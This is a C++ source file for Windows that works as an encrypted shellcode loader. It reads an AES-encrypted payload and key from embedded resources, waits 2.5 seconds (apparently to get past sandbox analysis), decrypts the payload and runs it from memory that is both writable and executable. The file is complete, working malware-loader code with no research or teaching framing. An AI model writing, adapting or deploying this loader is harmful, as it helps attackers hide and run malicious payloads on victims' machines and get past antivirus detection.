#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

// Helper to load encrypted resources
void LoadResourceData(const char* name, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResourceA(hModule, name, RT_RCDATA);
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

// Decrypt AES-256-CBC with IV = 16 null bytes
bool AESDecrypt(BYTE* encryptedData, DWORD encryptedSize, BYTE* key, DWORD keySize, BYTE** output, DWORD* outputSize) {
    HCRYPTPROV hProv = NULL;
    HCRYPTKEY hKey = NULL;
    HCRYPTHASH hHash = NULL;
    bool success = false;
    BYTE iv[16] = { 0 };

    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            CryptHashData(hHash, key, keySize, 0);
            if (CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
                CryptSetKeyParam(hKey, KP_IV, iv, 0);

                BYTE* buffer = (BYTE*)malloc(encryptedSize);
                memcpy(buffer, encryptedData, encryptedSize);

                DWORD dataLen = encryptedSize;
                if (CryptDecrypt(hKey, 0, TRUE, 0, buffer, &dataLen)) {
                    *output = buffer;
                    *outputSize = dataLen;
                    success = true;
                } else {
                    free(buffer);
                }
                CryptDestroyKey(hKey);
            }
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
    return success;
}

int main() {
    Sleep(2500);

    char* encryptedPayload = nullptr;
    DWORD payloadSize = 0;
    LoadResourceData("aes_payload", &encryptedPayload, &payloadSize);

    char* aesKey = nullptr;
    DWORD keySize = 0;
    LoadResourceData("aes_key", &aesKey, &keySize);

    BYTE* decrypted = nullptr;
    DWORD decryptedSize = 0;

    if (AESDecrypt((BYTE*)encryptedPayload, payloadSize, (BYTE*)aesKey, keySize, &decrypted, &decryptedSize)) {
        LPVOID execMem = VirtualAlloc(NULL, decryptedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(execMem, decrypted, decryptedSize);
        ((void(*)())execMem)();
        free(decrypted);
    }

    return 0;
}
